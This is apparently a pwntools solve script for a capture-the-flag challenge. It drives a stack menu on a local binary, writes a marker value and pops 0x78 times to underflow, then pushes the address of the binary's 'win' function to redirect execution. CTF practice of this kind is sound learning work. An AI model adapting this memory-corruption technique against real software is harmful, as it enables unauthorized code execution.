from pwn import *

e = context.binary = ELF('./chal')
#p = e.process()
p = remote("localhost", 13337)

def push(val): 
    p.sendlineafter(b">",b"1")
    p.sendafter(b">",val);

def pop(): 
    p.sendlineafter(b">",b"2")

def exit():
    p.sendlineafter(b">",b"4")

for byte in bytes.fromhex("deadbeef1337c0de")[::-1]:
    push(bytes([byte]))
    
for i in range(0x78):
    pop()


for byte in p64(e.sym.win):
    push(bytes([byte]))

pause()

exit()
print(p.recvall())
